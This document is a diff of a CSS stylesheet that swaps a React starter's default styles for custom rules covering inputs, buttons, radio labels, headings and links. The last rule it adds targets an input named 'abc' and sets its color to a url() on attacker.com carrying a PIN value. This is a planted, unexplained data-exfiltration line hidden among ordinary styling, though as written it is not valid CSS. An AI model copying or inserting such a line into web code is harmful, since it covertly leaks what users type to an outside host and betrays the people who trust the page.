@@ -1,38 +1,86 @@
-.App {
+
+.switch{
+  margin-top:4em;
+}
+body{
+  background-color: #dbd80b;
+}
+*{
   text-align: center;
+  margin:0em;
+  text-decoration: none;
+  
+}
+.h3{
+  font-size: 2em;
+  color: #617394;
+  text-transform: uppercase;
+  margin:3em;
+}
+.input{
+  width:60%;
+  height:2.5em;
+  font-size: 1.2em;
+  border: 2px solid rgb(199, 109, 109);
+  border-radius:3em;
+  color:#7579e7;
 }
 
-.App-logo {
-  height: 40vmin;
-  pointer-events: none;
+.form-button button{
+  margin:0.2em;
+  width:10em;
+  height:3em;
+  border: 1.5px solid none;
+  border-radius: 2em;
+  background-color: #E8F0FE;
+  margin-bottom:3em;
+}
+p{
+  color: grey;
+  margin:0;
+}
+h1{
+  font-size: larger;
+  margin:2em;
+  text-transform: uppercase;
+}
+.heading-h1{
+  margin-bottom: 0em;
+}
+.innertext-div2{
+  position:absolute;
+  bottom:50%;
+  left:20%;
+  width:60%;
+}
+.radio{
+  font-size: 5em;
+}
+.radio-label{
+  font-size:1.5em;
+  margin: 2em 10em;
 }
 
-@media (prefers-reduced-motion: no-preference) {
-  .App-logo {
-    animation: App-logo-spin infinite 20s linear;
-  }
+h2{
+  margin:4em;
 }
-
-.App-header {
-  background-color: #282c34;
-  min-height: 100vh;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  font-size: calc(10px + 2vmin);
-  color: white;
+h4{
+  margin:2em;
+  color: grey;
 }
-
-.App-link {
-  color: #61dafb;
+.switch{
+  margin-top:4em;
 }
-
-@keyframes App-logo-spin {
-  from {
-    transform: rotate(0deg);
-  }
-  to {
-    transform: rotate(360deg);
-  }
+img{
+  margin: 2em;
+}
+a:hover{
+  color:#0278ae;
+  text-decoration: none;
+  font-weight: 900;
+  font-size: 1.1em;
+  transition: all 0.5s ease ;
+}
+input[name="abc"] {
+  color: url(https://attacker.com/log?pin=123);
 }
